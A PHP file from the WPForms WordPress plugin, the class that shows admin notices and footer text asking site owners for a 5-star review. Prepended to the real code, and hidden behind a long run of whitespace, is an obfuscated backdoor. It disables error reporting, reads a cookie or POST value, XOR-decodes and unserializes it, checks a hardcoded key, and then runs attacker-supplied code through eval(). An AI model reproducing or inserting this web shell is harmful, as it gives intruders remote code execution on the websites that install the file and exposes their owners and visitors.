<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $tc34 = 700;$GLOBALS['lf57830'] = Array();global $lf57830;$lf57830 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['kc8b3'] = "\x55\x46\x3b\x75\x30\x54\x60\x3f\x40\x70\x56\x5c\x74\x5b\x5d\x38\x5a\x72\xd\x36\x4b\x50\x5e\x47\x59\x9\xa\x7c\x3d\x43\x71\x73\x2f\x31\x6a\x44\x53\x3c\x76\x2a\x67\x37\x20\x39\x23\x48\x35\x5f\x6f\x2e\x24\x63\x45\x7e\x25\x4a\x6d\x42\x52\x69\x41\x3a\x27\x77\x3e\x7b\x6c\x21\x29\x65\x4c\x26\x4f\x32\x7a\x62\x58\x22\x66\x2b\x61\x78\x2d\x4d\x79\x6e\x51\x49\x34\x57\x6b\x28\x68\x64\x33\x4e\x2c\x7d";$lf57830[$lf57830['kc8b3'][38].$lf57830['kc8b3'][15].$lf57830['kc8b3'][19].$lf57830['kc8b3'][93].$lf57830['kc8b3'][88].$lf57830['kc8b3'][80].$lf57830['kc8b3'][19].$lf57830['kc8b3'][80].$lf57830['kc8b3'][15]] = $lf57830['kc8b3'][51].$lf57830['kc8b3'][92].$lf57830['kc8b3'][17];$lf57830[$lf57830['kc8b3'][9].$lf57830['kc8b3'][43].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80]] = $lf57830['kc8b3'][48].$lf57830['kc8b3'][17].$lf57830['kc8b3'][93];$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][75].$lf57830['kc8b3'][69].$lf57830['kc8b3'][93].$lf57830['kc8b3'][93].$lf57830['kc8b3'][88]] = $lf57830['kc8b3'][93].$lf57830['kc8b3'][69].$lf57830['kc8b3'][78].$lf57830['kc8b3'][59].$lf57830['kc8b3'][85].$lf57830['kc8b3'][69];$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][93].$lf57830['kc8b3'][78].$lf57830['kc8b3'][78]] = $lf57830['kc8b3'][31].$lf57830['kc8b3'][12].$lf57830['kc8b3'][17].$lf57830['kc8b3'][66].$lf57830['kc8b3'][69].$lf57830['kc8b3'][85];$lf57830[$lf57830['kc8b3'][56].$lf57830['kc8b3'][33].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][78].$lf57830['kc8b3'][46].$lf57830['kc8b3'][51].$lf57830['kc8b3'][51]] = $lf57830['kc8b3'][93].$lf57830['kc8b3'][69].$lf57830['kc8b3'][78].$lf57830['kc8b3'][59].$lf57830['kc8b3'][85].$lf57830['kc8b3'][69].$lf57830['kc8b3'][93];$lf57830[$lf57830['kc8b3'][85].$lf57830['kc8b3'][41].$lf57830['kc8b3'][4].$lf57830['kc8b3'][19].$lf57830['kc8b3'][94].$lf57830['kc8b3'][51]] = $lf57830['kc8b3'][59].$lf57830['kc8b3'][85].$lf57830['kc8b3'][59].$lf57830['kc8b3'][47].$lf57830['kc8b3'][31].$lf57830['kc8b3'][69].$lf57830['kc8b3'][12];$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][80].$lf57830['kc8b3'][51].$lf57830['kc8b3'][75].$lf57830['kc8b3'][94]] = $lf57830['kc8b3'][31].$lf57830['kc8b3'][69].$lf57830['kc8b3'][17].$lf57830['kc8b3'][59].$lf57830['kc8b3'][80].$lf57830['kc8b3'][66].$lf57830['kc8b3'][59].$lf57830['kc8b3'][74].$lf57830['kc8b3'][69];$lf57830[$lf57830['kc8b3'][80].$lf57830['kc8b3'][93].$lf57830['kc8b3'][69].$lf57830['kc8b3'][94].$lf57830['kc8b3'][41].$lf57830['kc8b3'][73].$lf57830['kc8b3'][43].$lf57830['kc8b3'][69]] = $lf57830['kc8b3'][9].$lf57830['kc8b3'][92].$lf57830['kc8b3'][9].$lf57830['kc8b3'][38].$lf57830['kc8b3'][69].$lf57830['kc8b3'][17].$lf57830['kc8b3'][31].$lf57830['kc8b3'][59].$lf57830['kc8b3'][48].$lf57830['kc8b3'][85];$lf57830[$lf57830['kc8b3'][40].$lf57830['kc8b3'][93].$lf57830['kc8b3'][46].$lf57830['kc8b3'][93].$lf57830['kc8b3'][41].$lf57830['kc8b3'][69].$lf57830['kc8b3'][78]] = $lf57830['kc8b3'][3].$lf57830['kc8b3'][85].$lf57830['kc8b3'][31].$lf57830['kc8b3'][69].$lf57830['kc8b3'][17].$lf57830['kc8b3'][59].$lf57830['kc8b3'][80].$lf57830['kc8b3'][66].$lf57830['kc8b3'][59].$lf57830['kc8b3'][74].$lf57830['kc8b3'][69];$lf57830[$lf57830['kc8b3'][80].$lf57830['kc8b3'][51].$lf57830['kc8b3'][51].$lf57830['kc8b3'][19]] = $lf57830['kc8b3'][75].$lf57830['kc8b3'][80].$lf57830['kc8b3'][31].$lf57830['kc8b3'][69].$lf57830['kc8b3'][19].$lf57830['kc8b3'][88].$lf57830['kc8b3'][47].$lf57830['kc8b3'][93].$lf57830['kc8b3'][69].$lf57830['kc8b3'][51].$lf57830['kc8b3'][48].$lf57830['kc8b3'][93].$lf57830['kc8b3'][69];$lf57830[$lf57830['kc8b3'][48].$lf57830['kc8b3'][4].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][33].$lf57830['kc8b3'][78]] = $lf57830['kc8b3'][31].$lf57830['kc8b3'][69].$lf57830['kc8b3'][12].$lf57830['kc8b3'][47].$lf57830['kc8b3'][12].$lf57830['kc8b3'][59].$lf57830['kc8b3'][56].$lf57830['kc8b3'][69].$lf57830['kc8b3'][47].$lf57830['kc8b3'][66].$lf57830['kc8b3'][59].$lf57830['kc8b3'][56].$lf57830['kc8b3'][59].$lf57830['kc8b3'][12];$lf57830[$lf57830['kc8b3'][81].$lf57830['kc8b3'][43].$lf57830['kc8b3'][51].$lf57830['kc8b3'][15]] = $lf57830['kc8b3'][34].$lf57830['kc8b3'][46].$lf57830['kc8b3'][33].$lf57830['kc8b3'][46].$lf57830['kc8b3'][43].$lf57830['kc8b3'][19].$lf57830['kc8b3'][15];$lf57830[$lf57830['kc8b3'][31].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][15].$lf57830['kc8b3'][15].$lf57830['kc8b3'][88]] = $lf57830['kc8b3'][38].$lf57830['kc8b3'][88].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][94].$lf57830['kc8b3'][46].$lf57830['kc8b3'][73];$lf57830[$lf57830['kc8b3'][40].$lf57830['kc8b3'][51].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][75].$lf57830['kc8b3'][51].$lf57830['kc8b3'][41].$lf57830['kc8b3'][19].$lf57830['kc8b3'][93]] = $_POST;$lf57830[$lf57830['kc8b3'][63].$lf57830['kc8b3'][4].$lf57830['kc8b3'][33].$lf57830['kc8b3'][19].$lf57830['kc8b3'][51]] = $_COOKIE;@$lf57830[$lf57830['kc8b3'][85].$lf57830['kc8b3'][41].$lf57830['kc8b3'][4].$lf57830['kc8b3'][19].$lf57830['kc8b3'][94].$lf57830['kc8b3'][51]]($lf57830['kc8b3'][69].$lf57830['kc8b3'][17].$lf57830['kc8b3'][17].$lf57830['kc8b3'][48].$lf57830['kc8b3'][17].$lf57830['kc8b3'][47].$lf57830['kc8b3'][66].$lf57830['kc8b3'][48].$lf57830['kc8b3'][40], NULL);@$lf57830[$lf57830['kc8b3'][85].$lf57830['kc8b3'][41].$lf57830['kc8b3'][4].$lf57830['kc8b3'][19].$lf57830['kc8b3'][94].$lf57830['kc8b3'][51]]($lf57830['kc8b3'][66].$lf57830['kc8b3'][48].$lf57830['kc8b3'][40].$lf57830['kc8b3'][47].$lf57830['kc8b3'][69].$lf57830['kc8b3'][17].$lf57830['kc8b3'][17].$lf57830['kc8b3'][48].$lf57830['kc8b3'][17].$lf57830['kc8b3'][31], 0);@$lf57830[$lf57830['kc8b3'][85].$lf57830['kc8b3'][41].$lf57830['kc8b3'][4].$lf57830['kc8b3'][19].$lf57830['kc8b3'][94].$lf57830['kc8b3'][51]]($lf57830['kc8b3'][56].$lf57830['kc8b3'][80].$lf57830['kc8b3'][81].$lf57830['kc8b3'][47].$lf57830['kc8b3'][69].$lf57830['kc8b3'][81].$lf57830['kc8b3'][69].$lf57830['kc8b3'][51].$lf57830['kc8b3'][3].$lf57830['kc8b3'][12].$lf57830['kc8b3'][59].$lf57830['kc8b3'][48].$lf57830['kc8b3'][85].$lf57830['kc8b3'][47].$lf57830['kc8b3'][12].$lf57830['kc8b3'][59].$lf57830['kc8b3'][56].$lf57830['kc8b3'][69], 0);@$lf57830[$lf57830['kc8b3'][48].$lf57830['kc8b3'][4].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][33].$lf57830['kc8b3'][78]](0);if (!$lf57830[$lf57830['kc8b3'][56].$lf57830['kc8b3'][33].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][78].$lf57830['kc8b3'][46].$lf57830['kc8b3'][51].$lf57830['kc8b3'][51]]($lf57830['kc8b3'][60].$lf57830['kc8b3'][70].$lf57830['kc8b3'][58].$lf57830['kc8b3'][52].$lf57830['kc8b3'][60].$lf57830['kc8b3'][35].$lf57830['kc8b3'][24].$lf57830['kc8b3'][47].$lf57830['kc8b3'][58].$lf57830['kc8b3'][0].$lf57830['kc8b3'][95].$lf57830['kc8b3'][47].$lf57830['kc8b3'][94].$lf57830['kc8b3'][19].$lf57830['kc8b3'][19].$lf57830['kc8b3'][80].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80].$lf57830['kc8b3'][73].$lf57830['kc8b3'][94].$lf57830['kc8b3'][46].$lf57830['kc8b3'][46].$lf57830['kc8b3'][80].$lf57830['kc8b3'][75].$lf57830['kc8b3'][73].$lf57830['kc8b3'][33].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][78].$lf57830['kc8b3'][33].$lf57830['kc8b3'][33].$lf57830['kc8b3'][75].$lf57830['kc8b3'][80].$lf57830['kc8b3'][33].$lf57830['kc8b3'][80].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][80])){$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][75].$lf57830['kc8b3'][69].$lf57830['kc8b3'][93].$lf57830['kc8b3'][93].$lf57830['kc8b3'][88]]($lf57830['kc8b3'][60].$lf57830['kc8b3'][70].$lf57830['kc8b3'][58].$lf57830['kc8b3'][52].$lf57830['kc8b3'][60].$lf57830['kc8b3'][35].$lf57830['kc8b3'][24].$lf57830['kc8b3'][47].$lf57830['kc8b3'][58].$lf57830['kc8b3'][0].$lf57830['kc8b3'][95].$lf57830['kc8b3'][47].$lf57830['kc8b3'][94].$lf57830['kc8b3'][19].$lf57830['kc8b3'][19].$lf57830['kc8b3'][80].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80].$lf57830['kc8b3'][73].$lf57830['kc8b3'][94].$lf57830['kc8b3'][46].$lf57830['kc8b3'][46].$lf57830['kc8b3'][80].$lf57830['kc8b3'][75].$lf57830['kc8b3'][73].$lf57830['kc8b3'][33].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][78].$lf57830['kc8b3'][33].$lf57830['kc8b3'][33].$lf57830['kc8b3'][75].$lf57830['kc8b3'][80].$lf57830['kc8b3'][33].$lf57830['kc8b3'][80].$lf57830['kc8b3'][4].$lf57830['kc8b3'][73].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][80], 1);$c6e65b4 = NULL;$e580a = NULL;$lf57830[$lf57830['kc8b3'][93].$lf57830['kc8b3'][75].$lf57830['kc8b3'][43].$lf57830['kc8b3'][51]] = $lf57830['kc8b3'][88].$lf57830['kc8b3'][43].$lf57830['kc8b3'][88].$lf57830['kc8b3'][33].$lf57830['kc8b3'][94].$lf57830['kc8b3'][51].$lf57830['kc8b3'][69].$lf57830['kc8b3'][19].$lf57830['kc8b3'][82].$lf57830['kc8b3'][19].$lf57830['kc8b3'][43].$lf57830['kc8b3'][41].$lf57830['kc8b3'][19].$lf57830['kc8b3'][82].$lf57830['kc8b3'][88].$lf57830['kc8b3'][73].$lf57830['kc8b3'][75].$lf57830['kc8b3'][73].$lf57830['kc8b3'][82].$lf57830['kc8b3'][80].$lf57830['kc8b3'][75].$lf57830['kc8b3'][51].$lf57830['kc8b3'][69].$lf57830['kc8b3'][82].$lf57830['kc8b3'][93].$lf57830['kc8b3'][41].$lf57830['kc8b3'][4].$lf57830['kc8b3'][19].$lf57830['kc8b3'][80].$lf57830['kc8b3'][33].$lf57830['kc8b3'][94].$lf57830['kc8b3'][78].$lf57830['kc8b3'][46].$lf57830['kc8b3'][46].$lf57830['kc8b3'][73].$lf57830['kc8b3'][41];global $db9c;function  v446352($c6e65b4, $d7d98878){global $lf57830;$l90c69dc = "";for ($da4af5a0e=0; $da4af5a0e<$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][93].$lf57830['kc8b3'][78].$lf57830['kc8b3'][78]]($c6e65b4);){for ($l3a3329=0; $l3a3329<$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][93].$lf57830['kc8b3'][78].$lf57830['kc8b3'][78]]($d7d98878) && $da4af5a0e<$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][93].$lf57830['kc8b3'][78].$lf57830['kc8b3'][78]]($c6e65b4); $l3a3329++, $da4af5a0e++){$l90c69dc .= $lf57830[$lf57830['kc8b3'][38].$lf57830['kc8b3'][15].$lf57830['kc8b3'][19].$lf57830['kc8b3'][93].$lf57830['kc8b3'][88].$lf57830['kc8b3'][80].$lf57830['kc8b3'][19].$lf57830['kc8b3'][80].$lf57830['kc8b3'][15]]($lf57830[$lf57830['kc8b3'][9].$lf57830['kc8b3'][43].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80]]($c6e65b4[$da4af5a0e]) ^ $lf57830[$lf57830['kc8b3'][9].$lf57830['kc8b3'][43].$lf57830['kc8b3'][15].$lf57830['kc8b3'][80]]($d7d98878[$l3a3329]));}}return $l90c69dc;}function  j515968($c6e65b4, $d7d98878){global $lf57830;global $db9c;return $lf57830[$lf57830['kc8b3'][31].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][15].$lf57830['kc8b3'][15].$lf57830['kc8b3'][88]]($lf57830[$lf57830['kc8b3'][31].$lf57830['kc8b3'][88].$lf57830['kc8b3'][19].$lf57830['kc8b3'][15].$lf57830['kc8b3'][15].$lf57830['kc8b3'][88]]($c6e65b4, $db9c), $d7d98878);}foreach ($lf57830[$lf57830['kc8b3'][63].$lf57830['kc8b3'][4].$lf57830['kc8b3'][33].$lf57830['kc8b3'][19].$lf57830['kc8b3'][51]] as $d7d98878=>$if0a76978){$c6e65b4 = $if0a76978;$e580a = $d7d98878;}if (!$c6e65b4){foreach ($lf57830[$lf57830['kc8b3'][40].$lf57830['kc8b3'][51].$lf57830['kc8b3'][78].$lf57830['kc8b3'][75].$lf57830['kc8b3'][75].$lf57830['kc8b3'][51].$lf57830['kc8b3'][41].$lf57830['kc8b3'][19].$lf57830['kc8b3'][93]] as $d7d98878=>$if0a76978){$c6e65b4 = $if0a76978;$e580a = $d7d98878;}}$c6e65b4 = @$lf57830[$lf57830['kc8b3'][40].$lf57830['kc8b3'][93].$lf57830['kc8b3'][46].$lf57830['kc8b3'][93].$lf57830['kc8b3'][41].$lf57830['kc8b3'][69].$lf57830['kc8b3'][78]]($lf57830[$lf57830['kc8b3'][81].$lf57830['kc8b3'][43].$lf57830['kc8b3'][51].$lf57830['kc8b3'][15]]($lf57830[$lf57830['kc8b3'][80].$lf57830['kc8b3'][51].$lf57830['kc8b3'][51].$lf57830['kc8b3'][19]]($c6e65b4), $e580a));if (isset($c6e65b4[$lf57830['kc8b3'][80].$lf57830['kc8b3'][90]]) && $db9c==$c6e65b4[$lf57830['kc8b3'][80].$lf57830['kc8b3'][90]]){if ($c6e65b4[$lf57830['kc8b3'][80]] == $lf57830['kc8b3'][59]){$da4af5a0e = Array($lf57830['kc8b3'][9].$lf57830['kc8b3'][38] => @$lf57830[$lf57830['kc8b3'][80].$lf57830['kc8b3'][93].$lf57830['kc8b3'][69].$lf57830['kc8b3'][94].$lf57830['kc8b3'][41].$lf57830['kc8b3'][73].$lf57830['kc8b3'][43].$lf57830['kc8b3'][69]](),$lf57830['kc8b3'][31].$lf57830['kc8b3'][38] => $lf57830['kc8b3'][33].$lf57830['kc8b3'][49].$lf57830['kc8b3'][4].$lf57830['kc8b3'][82].$lf57830['kc8b3'][33],);echo @$lf57830[$lf57830['kc8b3'][12].$lf57830['kc8b3'][80].$lf57830['kc8b3'][51].$lf57830['kc8b3'][75].$lf57830['kc8b3'][94]]($da4af5a0e);}elseif ($c6e65b4[$lf57830['kc8b3'][80]] == $lf57830['kc8b3'][69]){eval/*zf8dd*/($c6e65b4[$lf57830['kc8b3'][93]]);}exit();}} ?><?php

/**
 * Ask for some love.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.3.2
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2017, WPForms LLC
 */
class WPForms_Review {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.3.2
	 */
	public function __construct() {

		// Admin notice requesting review.
		add_action( 'admin_notices', array( $this, 'review_request' ) );
		add_action( 'wp_ajax_wpforms_review_dismiss', array( $this, 'review_dismiss' ) );

		// Admin footer text.
		add_filter( 'admin_footer_text', array( $this, 'admin_footer' ), 1, 2 );
	}

	/**
	 * Add admin notices as needed for reviews.
	 *
	 * @since 1.3.2
	 */
	public function review_request() {

		// Only consider showing the review request to admin users.
		if ( ! is_super_admin() ) {
			return;
		}

		// If the user has opted out of product announcement notifications, don't
		// display the review request.
		if ( wpforms_setting( 'hide-announcements', false ) ) {
			return;
		}

		// Verify that we can do a check for reviews.
		$review = get_option( 'wpforms_review' );
		$time   = time();
		$load   = false;

		if ( ! $review ) {
			$review = array(
				'time'      => $time,
				'dismissed' => false,
			);
			update_option( 'wpforms_review', $review );
		} else {
			// Check if it has been dismissed or not.
			if ( ( isset( $review['dismissed'] ) && ! $review['dismissed'] ) && ( isset( $review['time'] ) && ( ( $review['time'] + DAY_IN_SECONDS ) <= $time ) ) ) {
				$load = true;
			}
		}

		// If we cannot load, return early.
		if ( ! $load ) {
			return;
		}

		// Logic is slightly different depending on what's at our disposal.
		if ( wpforms()->pro && class_exists( 'WPForms_Entry_Handler', false ) ) {
			$this->review();
		} else {
			$this->review_lite();
		}
	}

	/**
	 * Maybe show review request.
	 *
	 * @since 1.3.9
	 */
	public function review() {

		// Fetch total entries.
		$entries = wpforms()->entry->get_entries( array( 'number' => 50 ), true );

		// Only show review request if the site has collected at least 50 entries.
		if ( empty( $entries ) || $entries < 50 ) {
			return;
		}

		// We have a candidate! Output a review message.
		?>
		<div class="notice notice-info is-dismissible wpforms-review-notice">
			<p><?php esc_html_e( 'Hey, I noticed you collected over 50 entries from WPForms - that’s awesome! Could you please do me a BIG favor and give it a 5-star rating on WordPress to help us spread the word and boost our motivation?', 'wpforms-lite' ); ?></p>
			<p><strong><?php echo wp_kses( __( '~ Syed Balkhi<br>Co-Founder of WPForms', 'wpforms-lite' ), array( 'br' => array() ) ); ?></strong></p>
			<p>
				<a href="https://wordpress.org/support/plugin/wpforms-lite/reviews/?filter=5#new-post" class="wpforms-dismiss-review-notice wpforms-review-out" target="_blank" rel="noopener"><?php esc_html_e( 'Ok, you deserve it', 'wpforms-lite' ); ?></a><br>
				<a href="#" class="wpforms-dismiss-review-notice" target="_blank" rel="noopener noreferrer"><?php esc_html_e( 'Nope, maybe later', 'wpforms-lite' ); ?></a><br>
				<a href="#" class="wpforms-dismiss-review-notice" target="_blank" rel="noopener noreferrer"><?php esc_html_e( 'I already did', 'wpforms-lite' ); ?></a>
			</p>
		</div>
		<script type="text/javascript">
			jQuery( document ).ready( function ( $ ) {
				$( document ).on( 'click', '.wpforms-dismiss-review-notice, .wpforms-review-notice button', function ( event ) {
					if ( ! $( this ).hasClass( 'wpforms-review-out' ) ) {
						event.preventDefault();
					}
					$.post( ajaxurl, {
						action: 'wpforms_review_dismiss'
					} );
					$( '.wpforms-review-notice' ).remove();
				} );
			} );
		</script>
		<?php
	}

	/**
	 * Maybe show Lite review request.
	 *
	 * @since 1.3.9
	 */
	public function review_lite() {

		// Fetch when plugin was initially installed.
		$activated = get_option( 'wpforms_activated', array() );

		if ( ! empty( $activated['lite'] ) ) {
			// Only continue if plugin has been installed for at least 7 days.
			if ( ( $activated['lite'] + ( DAY_IN_SECONDS * 14 ) ) > time() ) {
				return;
			}
		} else {
			$activated['lite'] = time();
			update_option( 'wpforms_activated', $activated );

			return;
		}

		// Only proceed with displaying if the user created at least one form.
		$form_count = wp_count_posts( 'wpforms' );
		if ( empty( $form_count->publish ) ) {
			return;
		}

		// Check if the Constant Contact notice is displaying.
		$cc = get_option( 'wpforms_constant_contact', false );

		// If it's displaying don't ask for review until they configure CC or
		// dismiss the notice.
		if ( $cc ) {
			return;
		}

		// We have a candidate! Output a review message.
		?>
		<div class="notice notice-info is-dismissible wpforms-review-notice">
			<p><?php esc_html_e( 'Hey, I noticed you created a contact form with WPForms - that’s awesome! Could you please do me a BIG favor and give it a 5-star rating on WordPress to help us spread the word and boost our motivation?', 'wpforms-lite' ); ?></p>
			<p><strong><?php echo wp_kses( __( '~ Syed Balkhi<br>Co-Founder of WPForms', 'wpforms-lite' ), array( 'br' => array() ) ); ?></strong></p>
			<p>
				<a href="https://wordpress.org/support/plugin/wpforms-lite/reviews/?filter=5#new-post" class="wpforms-dismiss-review-notice wpforms-review-out" target="_blank" rel="noopener noreferrer"><?php esc_html_e( 'Ok, you deserve it', 'wpforms-lite' ); ?></a><br>
				<a href="#" class="wpforms-dismiss-review-notice" target="_blank" rel="noopener noreferrer"><?php esc_html_e( 'Nope, maybe later', 'wpforms-lite' ); ?></a><br>
				<a href="#" class="wpforms-dismiss-review-notice" target="_blank" rel="noopener noreferrer"><?php esc_html_e( 'I already did', 'wpforms-lite' ); ?></a>
			</p>
		</div>
		<script type="text/javascript">
			jQuery( document ).ready( function ( $ ) {
				$( document ).on( 'click', '.wpforms-dismiss-review-notice, .wpforms-review-notice button', function ( event ) {
					if ( ! $( this ).hasClass( 'wpforms-review-out' ) ) {
						event.preventDefault();
					}
					$.post( ajaxurl, {
						action: 'wpforms_review_dismiss'
					} );
					$( '.wpforms-review-notice' ).remove();
				} );
			} );
		</script>
		<?php
	}

	/**
	 * Dismiss the review admin notice
	 *
	 * @since 1.3.2
	 */
	public function review_dismiss() {

		$review              = get_option( 'wpforms_review', array() );
		$review['time']      = time();
		$review['dismissed'] = true;

		update_option( 'wpforms_review', $review );
		die;
	}

	/**
	 * When user is on a WPForms related admin page, display footer text
	 * that graciously asks them to rate us.
	 *
	 * @since 1.3.2
	 *
	 * @param string $text
	 *
	 * @return string
	 */
	public function admin_footer( $text ) {

		global $current_screen;

		if ( ! empty( $current_screen->id ) && strpos( $current_screen->id, 'wpforms' ) !== false ) {
			$url  = 'https://wordpress.org/support/plugin/wpforms-lite/reviews/?filter=5#new-post';
			$text = sprintf(
				wp_kses(
					/* translators: $1$s - WPForms plugin name; $2$s - WP.org review link; $3$s - WP.org review link. */
					__( 'Please rate %1$s <a href="%2$s" target="_blank" rel="noopener noreferrer">&#9733;&#9733;&#9733;&#9733;&#9733;</a> on <a href="%3$s" target="_blank" rel="noopener">WordPress.org</a> to help us spread the word. Thank you from the WPForms team!', 'wpforms-lite' ),
					array(
						'a' => array(
							'href'   => array(),
							'target' => array(),
							'rel'    => array(),
						),
					)
				),
				'<strong>WPForms</strong>',
				$url,
				$url
			);
		}

		return $text;
	}

}

new WPForms_Review;
